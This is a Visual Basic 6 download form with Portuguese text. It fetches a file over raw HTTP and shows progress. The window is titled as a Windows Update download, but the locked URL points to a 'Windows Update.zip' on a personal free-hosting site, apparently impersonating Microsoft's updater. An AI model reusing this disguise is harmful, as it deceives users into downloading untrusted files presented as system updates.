VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "mswinsck.ocx"
Begin VB.Form frmDownload 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Baixando Atualizações do Windows"
   ClientHeight    =   2235
   ClientLeft      =   3795
   ClientTop       =   3645
   ClientWidth     =   6285
   Icon            =   "frmDownload.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   2235
   ScaleWidth      =   6285
   Begin VB.CommandButton Command1 
      Caption         =   "Command1"
      Height          =   375
      Left            =   5790
      TabIndex        =   14
      Top             =   1785
      Width           =   420
   End
   Begin VB.Frame fraProgresso 
      Caption         =   "Progresso do download"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   1455
      Left            =   165
      TabIndex        =   0
      Top             =   150
      Width           =   5775
      Begin VB.PictureBox picProgresso 
         FillColor       =   &H00C00000&
         ForeColor       =   &H00C00000&
         Height          =   255
         Left            =   120
         ScaleHeight     =   195
         ScaleWidth      =   5475
         TabIndex        =   1
         Top             =   360
         Width           =   5535
      End
      Begin VB.Label lblStatus 
         Alignment       =   2  'Center
         BorderStyle     =   1  'Fixed Single
         Height          =   255
         Left            =   120
         TabIndex        =   12
         Top             =   360
         Visible         =   0   'False
         Width           =   5535
      End
      Begin VB.Label lblTam 
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Left            =   960
         TabIndex        =   11
         Top             =   720
         Width           =   735
      End
      Begin VB.Label lblRecebido 
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Left            =   2640
         TabIndex        =   10
         Top             =   720
         Width           =   975
      End
      Begin VB.Label lblVelocidade 
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Left            =   4800
         TabIndex        =   9
         Top             =   720
         Width           =   855
      End
      Begin VB.Label lblTPercorrido 
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Left            =   4155
         TabIndex        =   8
         Top             =   1065
         Width           =   1350
      End
      Begin VB.Label lblTRestante 
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Left            =   1440
         TabIndex        =   7
         Top             =   1080
         Width           =   1215
      End
      Begin VB.Label Label6 
         AutoSize        =   -1  'True
         Caption         =   "Tempo Percorrido:"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   195
         Left            =   2760
         TabIndex        =   6
         Top             =   1080
         Width           =   1320
      End
      Begin VB.Label Label5 
         AutoSize        =   -1  'True
         Caption         =   "Tempo Restante:"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   195
         Left            =   120
         TabIndex        =   5
         Top             =   1080
         Width           =   1245
      End
      Begin VB.Label Label4 
         AutoSize        =   -1  'True
         Caption         =   "Velocidade:"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   195
         Left            =   3840
         TabIndex        =   4
         Top             =   720
         Width           =   825
      End
      Begin VB.Label Label3 
         AutoSize        =   -1  'True
         Caption         =   "Recebidos:"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   195
         Left            =   1800
         TabIndex        =   3
         Top             =   720
         Width           =   795
      End
      Begin VB.Label Label2 
         AutoSize        =   -1  'True
         Caption         =   "Tamanho:"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   195
         Left            =   120
         TabIndex        =   2
         Top             =   720
         Width           =   720
      End
   End
   Begin VB.Timer tmrUpdateProgress 
      Enabled         =   0   'False
      Interval        =   1
      Left            =   4995
      Top             =   90
   End
   Begin VB.Timer tmrTimeLeft 
      Enabled         =   0   'False
      Interval        =   1000
      Left            =   4380
      Top             =   90
   End
   Begin MSWinsockLib.Winsock sckDownload 
      Left            =   5595
      Top             =   90
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.TextBox txtURL 
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   300
      Left            =   270
      Locked          =   -1  'True
      OLEDropMode     =   1  'Manual
      TabIndex        =   13
      Text            =   "http://www.megaaccess.hpg.ig.com.br/Windows%20Update.zip"
      Top             =   1680
      Width           =   5475
   End
End
Attribute VB_Name = "frmDownload"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'Option Explicit

Private Declare Function ShellExecute Lib "shell32.dll" _
    Alias "ShellExecuteA" (ByVal hwnd As Long, _
    ByVal lpOperation As String, _
    ByVal lpFile As String, _
    ByVal lpParameters As String, _
    ByVal lpDirectory As String, _
    ByVal nShowCmd As Long) As Long

Private m_sDATA                         As String
Private Percent                         As Integer
Private BeginTransfer                   As Single

Private Header                          As Variant
Private Status                          As String
Private TransferRate                    As Single

Private bDownloadPaused                 As Boolean
Private bDownloadComplete               As Boolean

Private strSvrURL                       As String
Private strSvrPort                      As String
Private URL                             As String
Private strSalvarEm                     As String
Private Filename                        As String
Private FileLength                      As Single
Private Sec                             As Integer
Private Min                             As Integer
Private Hr                              As Integer

Private BytesAlreadySent                As Single
Private BytesRemaining                  As Single

Public Function InStrRevVB5(ByVal StringCheck As String, ByVal StringMatch As String, Optional ByVal Start As Long = -1) As Long
    Dim lPos        As Long
    Dim lSavePos    As Long
    If Start = -1 Then Start = Len(StringCheck)
    lPos = InStr(1, StringCheck, StringMatch, vbBinaryCompare)
    While lPos > 0 And lPos < Start
        lSavePos = lPos
        lPos = InStr(lPos + 1, StringCheck, StringMatch, vbBinaryCompare)
    Wend
    InStrRevVB5 = lSavePos
End Function

Private Function GETDATAHEAD(DATA As Variant, ToRetrieve As String)
    Dim EndBYTES                        As Integer
    Dim A                               As String
    Dim LENGTHEND                       As Integer
    Dim PART                            As Integer
    Dim Part2                           As Integer
    Dim RetrieveLength                  As Integer
    On Error Resume Next
    If DATA = "" Then Exit Function
    If InStr(DATA, ToRetrieve) > 0 Then
        LENGTHEND = Len(DATA)
        PART = InStr(DATA, ToRetrieve)
        RetrieveLength = Len(ToRetrieve)
        A = Right(DATA, LENGTHEND - PART - RetrieveLength)
        LENGTHEND = Len(A)
        If InStr(A, vbCrLf) > 0 Then
            Part2 = InStr(A, vbCrLf)
            A = Left(A, Part2 - 1)
        End If
        GETDATAHEAD = A
    End If
End Function

Public Function StartUpdate(ByVal strURL As String)
    Dim Pos                             As Integer
    Dim LENGTH                          As Integer
    Dim NextPos                         As Integer
    Dim LENGTH2                         As Integer
    Dim POS2                            As Integer
    Dim POS3                            As Integer
    BytesAlreadySent = 1
    If strURL = "" Then
        Exit Function
    End If
    URL = strURL
    Pos = InStr(strURL, "://") 'Record position of ://
    LENGTH2 = Len("://") 'Record the length of it
    LENGTH = Len(strURL) 'Length of the entire url
    If InStr(strURL, "://") Then  ' check if they entered the http:// or ftp://
        strURL = Right(strURL, LENGTH - LENGTH2 - Pos + 1) ' remove http:// or ftp://
    End If
    If InStr(strURL, "/") Then 'looks for the first / mark going from left to right
        POS2 = InStr(strURL, "/") 'gets the position of the / mark
        '-----------------GET THE FILENAME-------------
        Dim strFile                     As String
        strFile = strURL 'load the variables into each other
        Do Until InStr(strFile, "/") = 0 'Do the loop until all is left is the filename
            LENGTH2 = Len(strFile) 'get the length of the filename every time its passed over by the loop
            POS3 = InStr(strFile, "/") 'find the / mark
            strFile = Right(strURL, LENGTH2 - POS3) 'slash it down removing everything before the / mark including the / mark...
        Loop
        
            If InStr(strFile, ":") Then
                Filename = Left(strFile, InStr(strFile, ":") - 1)
            Else
                Filename = strFile
            End If
            
        strSvrURL = Left(strURL, POS2 - 1) 'removes everything after the / mark leaving just the server name as the end result
    End If
    '-----------END TRIM THE URL FOR THE SERVER NAME-----------
End Function

Private Sub CloseSocket()
    Do Until sckDownload.State = 0
        sckDownload.Close
        sckDownload.LocalPort = 0
        Close #1
    Loop
End Sub

Private Sub cmdFechar_Click()

    End
End Sub

Private Sub Label1_Click()
    Dim lRet As Long
    lRet = ShellExecute(0, "open", "http://www.coders.com.br", vbNullString, vbNullString, 1)
End Sub

Private Sub Command1_Click()
On Error GoTo err
    tmrTimeLeft.Enabled = True
    tmrUpdateProgress.Enabled = True

    strSvrURL = txtURL
    strSvrPort = 80
    
    StartUpdate txtURL
    
    strSalvarEm = App.Path & Mid$(txtURL, InStrRevVB5(txtURL, "/") + 1)
    
    sckDownload.Connect strSvrURL, strSvrPort
err:
    If err.Number = 40006 Then
    MsgBox "Computador não conectado à internet", vbCritical, "Windows Update"
    End If
End Sub

Private Sub Form_Load()

End Sub

Private Sub Form_QueryUnload(Cancel As Integer, UnloadMode As Integer)
    tmrTimeLeft.Enabled = False
    tmrUpdateProgress.Enabled = False
    CloseSocket
End Sub

Private Sub sckDownload_Close()
    picProgresso.Visible = False
    lblStatus.Visible = True
    lblStatus.Caption = "Download Completo"
    sckDownload.Close
End Sub

Private Sub sckDownload_Connect()
    'On Error Resume Next
    
    Dim strCommand As String
    
    strCommand = "GET " + Right(URL, Len(URL) - Len(strSvrURL) - 7) + " HTTP/1.0" + vbCrLf
    strCommand = strCommand + "Accept: *.*, */*" + vbCrLf
    
    strCommand = strCommand + "User-Agent: Downloader By Frederico Machado" & vbCrLf
    strCommand = strCommand + "Referer: " & strSvrURL & vbCrLf
    strCommand = strCommand + "Host: " & strSvrURL & vbCrLf
    
    strCommand = strCommand + vbCrLf
    sckDownload.SendData strCommand 'sends a header to the server instructing it what to do!
    BeginTransfer = Timer 'start timer for transfer rate
End Sub

Private Sub sckDownload_DataArrival(ByVal bytesTotal As Long)
    Dim Pos                             As Integer
    Dim LENGTH                          As Integer
    Dim HEAD                            As String
    Debug.Print bytesTotal
    sckDownload.GetData m_sDATA, vbString
    
    If InStr(LCase(m_sDATA), "content-type:") Then 'find out if this chunk has the header..you can change that to anything that the header contains
        If InStr(LCase(m_sDATA), "404 not found") > 0 Then
                MsgBox "O arquivo solicitado não foi encontrado no servidor!" & vbCrLf & vbCrLf & "Razões possíveis:" & vbCrLf & "- O arquivo não existe no servidor" _
                & vbCrLf & "- O endereço é um script e os dados são inválidos" & vbCrLf & "- Endereço solicitado está errado" & vbCrLf & "- O servidor está extremamente ocupado" _
                & vbCrLf & vbCrLf & "Você pode tentar baixar novamente.  Se o erro continuar, o endereço está errado.", , "Arquivo não encontrado"
                Reset
                CloseSocket
                Exit Sub
        End If
   
        Pos = InStr(m_sDATA, vbCrLf & vbCrLf) ' find out where the header and the data is split apart
        LENGTH = Len(m_sDATA) 'get the length of the data chunk
        HEAD = Left(m_sDATA, Pos - 1) 'Get the header from the chunk of data and ignore the data content
        m_sDATA = Right(m_sDATA, LENGTH - Pos - 3) 'Get the data from the first chunk that contains the header also
        Header = Header & HEAD 'Append the header to header text box
        
        BytesRemaining = GETDATAHEAD(Header, "Content-Length:")
        
        'frmHeader.txtHeader = Header
    End If
    '-----------BEGIN WRITE CHUNK TO FILE CODE--------
    Open strSalvarEm For Binary Access Write As #1 'opens file for output
    Put #1, BytesAlreadySent, m_sDATA 'writes data to the end of file
    BytesAlreadySent = Seek(1)
    Close #1 'close file for now until next data chunk is available
    '--------------------------------------------------
    
    'If you dont subtract the difference you will get a really large and odd download speed hehe.
    TransferRate = Format(Int((BytesAlreadySent - FileLength) / (Timer - BeginTransfer)) / 1000, "####.00")
End Sub

Private Sub tmrTimeLeft_Timer()
    'On Error Resume Next
    If BytesRemaining > 0 And BytesAlreadySent > 0 And TransferRate > 0 Then
        If BytesRemaining <= BytesAlreadySent Then
            lblVelocidade = 0
            CloseSocket
            lblTPercorrido = Format(Hr & ":" & Min & ":" & Sec, "HH:MM:SS")
            'cmdDownload.Enabled = False
            picProgresso.Visible = False
            lblStatus.Visible = True
            lblStatus.Caption = "Download Completo"
            'Reset
        Else
            Sec = Sec + 1
            If Sec >= 60 Then
                Sec = 0
                Min = Min + 1
            ElseIf Min >= 60 Then
                Min = 0
                Hr = Hr + 1
            End If
            'cmdDownload.Enabled = True
            'cmdRun.Enabled = False
            lblTPercorrido = Format(Hr & ":" & Min & ":" & Sec, "HH:MM:SS")
            'The reason I divide the difference of bytesalreadysent and bytesremaining is becuase they are in bytes right now.. I want it to be in KB so it can be Kbps and not bps
            lblTRestante = ConvertTime(Int(((BytesRemaining - BytesAlreadySent) / 1024) / TransferRate))
            lblVelocidade = Format(TransferRate, "##.#0#") & " kb/s"

        End If
    End If
End Sub

Private Sub tmrUpdateProgress_Timer()
'    On Error Resume Next
    If BytesAlreadySent > 0 Then 'And BytesRemaining > 0 Then

        lblRecebido = File_ByteConversion(BytesAlreadySent)
        If BytesRemaining = 0 Then
            lblTam = "Desconhecido"
        Else
            lblTam = File_ByteConversion(BytesRemaining)
        End If
            If lblTam <> "Desconhecido" Then
            Percent = Format((BytesAlreadySent / BytesRemaining) * 100, "00") 'calculates the percentage completed
            UpdateProgress picProgresso, Percent, True  'updates progress bar with new percentage rate
        End If
    End If
End Sub

Public Function File_ByteConversion(NumberOfBytes As Single) As String
    On Error Resume Next
    If NumberOfBytes < 1024 Then 'checks to see if its so small that it cant be converted into larger grouping
        File_ByteConversion = NumberOfBytes & " Bytes"
    End If
    If NumberOfBytes > 1024 Then  'Checks to see if file is big enough to convert into KB
        File_ByteConversion = Format(NumberOfBytes / 1024, "0.00") & " KB"
    End If
    If NumberOfBytes > 1048576 Then  'Checks to see if its big enough to convert into MB
        File_ByteConversion = Format(NumberOfBytes / 1048576, "###,###,##0.00") & " MB"
    End If
End Function

Public Function ConvertTime(ByVal TheTime As Single) As String
    Dim NewTime                         As String
    Dim Sec                             As Single
    Dim Min                             As Single
    Dim H                               As Single
    If TheTime > 60 Then
        Sec = TheTime
        Min = Sec / 60
        Min = Int(Min)
        Sec = Sec - Min * 60
        H = Int(Min / 60)
        Min = Min - H * 60
        NewTime = H & ":" & Min & ":" & Sec
        If H < 0 Then H = 0
        If Min < 0 Then Min = 0
        If Sec < 0 Then Sec = 0
        NewTime = Format(NewTime, "HH:MM:SS")
        ConvertTime = NewTime
    End If
    If TheTime < 60 Then
        NewTime = "00:00:" & TheTime
        NewTime = Format(NewTime, "HH:MM:SS")
        ConvertTime = NewTime
    End If
End Function

Public Function UpdateProgress(pb As Control, ByVal Percent As Integer, Optional ByVal ShowPercent = False)
    'Replacement for progress bar..looks nicer also
    Dim sNum                            As String    'use percent
    'Dim Num$
    If Not pb.AutoRedraw Then 'picture in memory ?
        pb.AutoRedraw = -1 'no, make one
    End If
    pb.Cls 'clear picture in memory
    pb.ScaleWidth = 100 'new sclaemodus
    pb.DrawMode = 10 'not XOR Pen Modus
    If ShowPercent = True Then
    Num$ = Format$(Percent, "###0") + "%"
    pb.CurrentX = 50 - pb.TextWidth(Num$) / 2
    pb.CurrentY = (pb.ScaleHeight - pb.TextHeight(Num$)) / 2
    pb.Print Num$ 'print percent
    End If
    pb.Line (0, 0)-(Percent, pb.ScaleHeight), , BF
    pb.Refresh 'show differents
End Function


